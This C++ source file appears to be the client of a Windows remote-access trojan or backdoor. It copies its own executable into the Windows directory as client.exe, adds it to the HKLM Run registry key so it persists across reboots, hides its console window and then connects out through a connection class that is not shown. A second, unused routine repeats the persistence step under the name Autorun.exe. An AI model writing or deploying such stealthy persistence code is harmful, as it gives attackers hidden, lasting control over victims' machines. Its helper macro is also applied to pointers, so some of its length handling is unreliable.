#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define STRLEN(x) (sizeof(x)/sizeof(TCHAR) - 1)

#include "client.h"
#include "connect.h"
#include <windows.h>

#include <cstdio> 
#include <cstring> 

void Client::start_programm() {
	hide_to_bg();
	Connect connect;
	connect.establish_connection();
}

bool load_to_autorun() {
    HKEY hKey = NULL;
    LONG lResult = 0;

    std::unique_ptr<TCHAR[]> programm_name_temp(new TCHAR[MAX_PATH + 1]);
    TCHAR* programm_name = programm_name_temp.get();
    std::unique_ptr<TCHAR[]> win_path_temp(new TCHAR[MAX_PATH + 1]);
    TCHAR* win_path = win_path_temp.get();

    GetModuleFileName(NULL, programm_name, STRLEN(programm_name));
    GetWindowsDirectory(win_path, STRLEN(win_path));
    lstrcat(win_path, L"\\client.exe");

    if (0 == CopyFile(programm_name, win_path, FALSE)) {
        return FALSE;
    }
    lResult = RegOpenKey(
        HKEY_LOCAL_MACHINE,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        &hKey);
    if (ERROR_SUCCESS != lResult) {
        return FALSE;
    }
    RegSetValueEx(hKey, L"client", 0, REG_SZ, (PBYTE)win_path,
        lstrlen(win_path) * sizeof(TCHAR) + 1);
    RegCloseKey(hKey);
    return TRUE;
}

BOOL SelfAutorun() {
    HKEY hKey = NULL;
    LONG lResult = 0;
    TCHAR szExeName[MAX_PATH + 1];
    TCHAR szWinPath[MAX_PATH + 1];
    GetModuleFileName(NULL, szExeName, STRLEN(szExeName));
    GetWindowsDirectory(szWinPath, STRLEN(szWinPath));
    lstrcat(szWinPath, L"\\Autorun.exe");
    if (0 == CopyFile(szExeName, szWinPath, FALSE)) {
        return FALSE;
    }
    lResult = RegOpenKey(
        HKEY_LOCAL_MACHINE,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        &hKey);
    if (ERROR_SUCCESS != lResult) {
        return FALSE;
    }
    RegSetValueEx(hKey, L"Autorun", 0, REG_SZ, (PBYTE)szWinPath,
        lstrlen(szWinPath) * sizeof(TCHAR) + 1);
    RegCloseKey(hKey);
    return TRUE;
}


void Client::hide_to_bg() {
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
}

int main() {
    Client client;
    load_to_autorun();
    MessageBox(NULL, L"Success!", L"client", 0);
	client.start_programm();
    ExitProcess(0);
}